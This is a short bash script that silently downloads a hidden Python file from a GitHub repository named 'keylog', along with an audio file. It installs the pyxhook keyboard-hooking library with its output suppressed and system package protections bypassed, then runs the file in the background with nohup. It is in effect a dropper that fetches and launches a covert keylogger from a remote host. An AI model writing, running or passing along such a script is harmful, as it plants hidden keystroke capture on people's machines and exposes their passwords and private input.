#!/bin/bash

wget -q https://raw.githubusercontent.com/k-haynie/keylog/main/.log.py
wget -q https://raw.githubusercontent.com/k-haynie/keylog/main/.music.mp3
yes | pip3 install pyxhook pygame --quiet --quiet --quiet -break-system-packages
nohup python3 .log.py &
